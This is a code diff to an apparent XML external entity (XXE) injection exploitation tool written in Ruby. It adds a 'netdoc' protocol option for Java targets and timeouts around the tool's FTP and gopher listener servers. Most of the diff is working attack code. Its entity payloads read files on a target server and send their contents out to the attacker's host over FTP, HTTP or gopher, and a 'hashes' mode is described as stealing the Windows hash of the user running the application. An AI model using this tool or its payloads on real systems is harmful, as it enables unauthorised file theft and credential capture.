@@ -33,6 +33,7 @@ expect = "" # command that gets executed using PHP expect
 $xslt = "n" # tests for XSLT
 
 $dtdi = "y" # if yes then DTD is injected automatically
+$rproto = "file" # file or netdoc protocol to retrieve data
 output = "brute.log" # output file for brute and logger modes
 $verbose = "n" # verbose messaging
 timeout = 10 # timeout for receiving responses
@@ -74,6 +75,7 @@ ARGV.each do |arg|
 	brute = "logger" if arg.include?("--logger")
 	output = arg.split("=")[1] if arg.include?("--output=")
 	$secfile = arg.split("=")[1] if arg.include?("--2ndfile=")
+	$rproto = "netdoc" if arg.include?("--netdoc")
 end
 
 # show DTD to inject
@@ -115,6 +117,7 @@ if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == ""
 	puts "  --direct		Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
 	puts "  --2ndfile		File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
 	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
+	puts "  --netdoc		Use netdoc protocol instead of file (Java)."
 	puts "  --enumports		Enumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)"
 	puts ""
 	puts "  --hashes	Steals Windows hash of the user that runs an application."
@@ -144,8 +147,8 @@ if ARGV.nil? || (ARGV.size < 3 && logger == "n") || (host == "" && $direct == ""
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher"
 	puts "  Second order exploitation:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt"
-	puts "  Bruteforcing files using HTTP out of band method:"
-	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http"
+	puts "  Bruteforcing files using HTTP out of band method and netdoc protocol:"
+	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc"
 	puts "  Enumerating using direct exploitation:"
 	puts "  ruby #{__FILE__} --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK"
 	puts "  Enumerating unfiltered ports:"
@@ -266,7 +269,7 @@ def configreq()
 		turi = URI.decode($uri).gsub("+", " ")
 		if turi.include?("XXEINJECT")
 			if $direct != ""
-				$uri = $uri.sub("XXEINJECT", "file:///#{$directpath}")
+				$uri = $uri.sub("XXEINJECT", $rproto + ":///#{$directpath}")
 			elsif $xslt == "n"
 				$uri = $uri.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
 			else
@@ -310,7 +313,7 @@ def configreq()
 			if $dtdi == "y"
 				if header.include?("XXEINJECT")
 					if $direct != ""
-						header = header.sub("XXEINJECT", "file:///#{$directpath}")
+						header = header.sub("XXEINJECT", $rproto + ":///#{$directpath}")
 					elsif $urlencode == "y"
 						if $xslt == "n"
 							header = header.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+").gsub(";", "%3B"))
@@ -348,7 +351,7 @@ def configreq()
 				tline = URI.decode(postline).gsub("+", " ")
 				if tline.include?("XXEINJECT") && $xslt == "n"
 					if $direct != ""
-						postline = postline.sub("XXEINJECT", "file:///#{$directpath}")
+						postline = postline.sub("XXEINJECT", $rproto + ":///#{$directpath}")
 					elsif $urlencode == "y"
 						if $xslt == "n"
 							postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
@@ -624,7 +627,7 @@ loop do
 
 			# respond with proper XML
 			if hashes == "y"
-				payload = "<!ENTITY % payl \"hashes\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'file:////#{host}/hash/hash.txt'>\">"
+				payload = "<!ENTITY % payl \"hashes\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM '#{$rproto}:////#{host}/hash/hash.txt'>\">"
 				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 			elsif upload != ""
 				payload = "<!ENTITY % payl \"upload\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'jar:http://#{host}:#{jar_port}!/upload'>\">"
@@ -649,7 +652,7 @@ loop do
 				end
 			elsif enum == "ftp" && expect == ""
 				if phpfilter == "n"
-					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
+					payload = "<!ENTITY % payl SYSTEM \"#{$rproto}:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
 					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 				else
 					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
@@ -657,14 +660,14 @@ loop do
 				end
 			elsif enum == "http" && expect == ""
 				if phpfilter == "n"
-					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
+					payload = "<!ENTITY % payl SYSTEM \"#{$rproto}:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
 					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 				else
 					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
 					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 				end
 			elsif enum == "gopher" && expect == ""
-				payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'gopher://#{host}:#{gopher_port}/?gopher=%payl;'>\">"
+				payload = "<!ENTITY % payl SYSTEM \"#{$rproto}:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'gopher://#{host}:#{gopher_port}/?gopher=%payl;'>\">"
 				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 			end
 			puts "XML payload sent:\n#{payload}\n\n" if $verbose == "y"
@@ -766,7 +769,6 @@ loop do
 			end
 		end
 		client.close
-
 	}
   end
 end
@@ -782,155 +784,43 @@ if enum == "ftp"
 		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
 		tmppath = nextpath
 		client.puts("220 XXEinjector Welcomes!")
-		loop {
-			req = client.gets()
-			break if req.nil?	
-
-			# respond with proper option
-			if req.include? "LIST"
-				client.puts("drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe")
-				client.puts("150 Opening BINARY mode data connection for /xxe")
-				client.puts("226 Transfer complete")
-			end
-			if req.include? "USER"
-				client.puts("331 password required")
-			end
-			if req.include? "PORT"
-				client.puts("200 PORT command OK")
-			else
-				client.puts("230 Now you can send data")
-			end
-		
-			# truncate requests to proper format and base64 decode if encoded
-			if req.include? "RETR "
-				req = req.split(' ')[1..-1].join(' ')
-				req += "\n"
-			end
-
-			if phpfilter == "y"
-				req = Base64.decode64(req)
-			end
-
-			# if PHP expect then print and exit
-			if expect != ""
-				puts "Result of \"#{expect}\" command:\n" + req
-				exit(1)
-			end
+		begin
+		status = Timeout::timeout(30) {
+			loop {
+				req = client.gets()
+				break if req.nil?	
+	
+				# respond with proper option
+				if req.include? "LIST"
+					client.puts("drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe")
+					client.puts("150 Opening BINARY mode data connection for /xxe")
+					client.puts("226 Transfer complete")
+				end
+				if req.include? "USER"
+					client.puts("331 password required")
+				end
+				if req.include? "PORT"
+					client.puts("200 PORT command OK")
+				else
+					client.puts("230 Now you can send data")
+				end
 			
-			# log to separate file or output file if in bruteforce mode
-			if brute == ""
-				logpath = ""
-				logpath += "#{path}"
-				if tmppath != ""
-					if cut == 1
-						logpath += "/"
-					else
-						logpath += "\\"
-					end
+				# truncate requests to proper format and base64 decode if encoded
+				if req.include? "RETR "
+					req = req.split(' ')[1..-1].join(' ')
+					req += "\n"
 				end
-				logpath += "#{tmppath}"
-				logpath = logpath.gsub('\\','/')
-				logpath[0] = "" if logpath[0] == "/"
-				if tmppath != ""
-					FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-				else
-					if logpath.include?("/")
-						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
-					else
-						FileUtils.mkdir_p $remote + "/" + logpath
-					end
+	
+				if phpfilter == "y"
+					req = Base64.decode64(req)
 				end
-				if  done == 0
-					if cut == 1
-						puts "Successfully logged file: /#{logpath}"
-						done = 1
-					else
-						puts "Successfully logged file: #{logpath}"
-						done = 1
-					end
+	
+				# if PHP expect then print and exit
+				if expect != ""
+					puts "Result of \"#{expect}\" command:\n" + req
+					exit(1)
 				end
-				if logpath == ""
-					log = File.open($remote + "/" + "rootdir.log", "a")
-				else
-					log = File.open($remote + "/" + "#{logpath}.log", "a")
-				end
-				log.write req
-				log.close
-			else
-				log = File.open(output, "a")
-				log.write req
-				puts "Next results:\n#{req}\n" if logger == "y" || $verbose == "y"
-				print "> " if logger == "y"
-				log.close
-			end	
-
-			# clear requests that are known to be not part of directory listing
-			req = req.chomp
-			if req.match(/^USER /)
-				req = ""
-			end
-			if req.match(/^PASS /)
-				req = ""
-			end
-			if req == "TYPE I"
-				req = ""
-			end
-			if req.include? "EPSV"
-				req = ""
-			end
-			if req == "TYPE A"
-				req = ""
-			end
-			if req == "LIST"
-				req = ""
-			end
-			if req.include?("CWD ")
-				req = ""
-			end
-
-			# push to array if directory listing is detected for further enumeration
-			if brute == ""
-				if req.match regex
-					logp = tmppath
-					if tmppath != ""
-						if cut == 1
-							logp += "/"
-						else
-							logp += "\\"
-						end
-					end
-					logp += req
-					filenames.push(logp)
-					puts "Path pushed to array: #{logp}" if $verbose == "y"
-				end
-			end
-
-		}
-  	  end
-	end
-	end
-end
-
-# gopher server to read files/directory listings and log to files
-if enum == "gopher"
-	Thread.start do
-	loop do
- 	  Thread.start(gopher.accept) do |client|
-		done = 0
-		switch = 0
-		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
-		tmppath = nextpath
-		loop {
-			req = ""
-			loop do
-				tmp = client.gets()
-				break if tmp.chomp == ""
-				req += tmp
-			end
-
-			req.sub! 'gopher=', ''
-			req.split("\n").each do |param|
-
+				
 				# log to separate file or output file if in bruteforce mode
 				if brute == ""
 					logpath = ""
@@ -968,19 +858,43 @@ if enum == "gopher"
 					else
 						log = File.open($remote + "/" + "#{logpath}.log", "a")
 					end
-					log.write param + "\n"
+					log.write req
 					log.close
 				else
 					log = File.open(output, "a")
-					log.write param + "\n"
-					puts "Next results:\n#{param}\n" if logger == "y" || $verbose == "y"
+					log.write req
+					puts "Next results:\n#{req}\n" if logger == "y" || $verbose == "y"
 					print "> " if logger == "y"
 					log.close
+				end	
+	
+				# clear requests that are known to be not part of directory listing
+				req = req.chomp
+				if req.match(/^USER /)
+					req = ""
 				end
-		
+				if req.match(/^PASS /)
+					req = ""
+				end
+				if req == "TYPE I"
+					req = ""
+				end
+				if req.include? "EPSV"
+					req = ""
+				end
+				if req == "TYPE A"
+					req = ""
+				end
+				if req == "LIST"
+					req = ""
+				end
+				if req.include?("CWD ")
+					req = ""
+				end
+	
 				# push to array if directory listing is detected for further enumeration
 				if brute == ""
-					if param.match regex
+					if req.match regex
 						logp = tmppath
 						if tmppath != ""
 							if cut == 1
@@ -989,14 +903,114 @@ if enum == "gopher"
 								logp += "\\"
 							end
 						end
-						logp += param
+						logp += req
 						filenames.push(logp)
 						puts "Path pushed to array: #{logp}" if $verbose == "y"
 					end
 				end
-			end
-
+	
+			}
 		}
+		rescue Timeout::Error
+		end
+		client.close
+  	  end
+	end
+	end
+end
+
+# gopher server to read files/directory listings and log to files
+if enum == "gopher"
+	Thread.start do
+	loop do
+ 	  Thread.start(gopher.accept) do |client|
+		done = 0
+		switch = 0
+		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
+		tmppath = nextpath
+		begin
+		status = Timeout::timeout(30) {
+			loop {
+				req = ""
+				loop do
+					tmp = client.gets()
+					break if tmp.chomp == ""
+					req += tmp
+				end
+	
+				req.sub! 'gopher=', ''
+				req.split("\n").each do |param|
+	
+					# log to separate file or output file if in bruteforce mode
+					if brute == ""
+						logpath = ""
+						logpath += "#{path}"
+						if tmppath != ""
+							if cut == 1
+								logpath += "/"
+							else
+								logpath += "\\"
+							end
+						end
+						logpath += "#{tmppath}"
+						logpath = logpath.gsub('\\','/')
+						logpath[0] = "" if logpath[0] == "/"
+						if tmppath != ""
+							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
+						else
+							if logpath.include?("/")
+								FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
+							else
+								FileUtils.mkdir_p $remote + "/" + logpath
+							end
+						end
+						if  done == 0
+							if cut == 1
+								puts "Successfully logged file: /#{logpath}"
+								done = 1
+							else
+								puts "Successfully logged file: #{logpath}"
+								done = 1
+							end
+						end
+						if logpath == ""
+							log = File.open($remote + "/" + "rootdir.log", "a")
+						else
+							log = File.open($remote + "/" + "#{logpath}.log", "a")
+						end
+						log.write param + "\n"
+						log.close
+					else
+						log = File.open(output, "a")
+						log.write param + "\n"
+						puts "Next results:\n#{param}\n" if logger == "y" || $verbose == "y"
+						print "> " if logger == "y"
+						log.close
+					end
+			
+					# push to array if directory listing is detected for further enumeration
+					if brute == ""
+						if param.match regex
+							logp = tmppath
+							if tmppath != ""
+								if cut == 1
+									logp += "/"
+								else
+									logp += "\\"
+								end
+							end
+							logp += param
+							filenames.push(logp)
+							puts "Path pushed to array: #{logp}" if $verbose == "y"
+						end
+					end
+				end
+	
+			}
+		}
+		rescue Timeout::Error
+		end
+		client.close
   	  end
 	end
 	end
@@ -1025,8 +1039,9 @@ if enumports != ""
 				Thread.start do
 				loop do
 				  enum = TCPServer.new j
-  				  Thread.start(enum.accept) do
+  				  Thread.start(enum.accept) do |client|
 					ports += String(j) + ","
+					client.close
 					break
 				  end
 				end
@@ -1049,8 +1064,9 @@ if enumports != ""
 				Thread.start do
 				loop do
 				  enum = TCPServer.new tcpport
-  				  Thread.start(enum.accept) do
+  				  Thread.start(enum.accept) do |client|
 					ports += String(tcpport) + ","
+					client.close
 					break
 				  end
 				end
@@ -1104,8 +1120,9 @@ if $xslt == "y"
 	test = 0
 	Thread.start do
 	loop do
-  	  Thread.start(xsltserv.accept) do
+  	  Thread.start(xsltserv.accept) do |client|
 		puts "XSLT injection is working!"
+		client.close
 		exit(1)
 	  end		
 	end
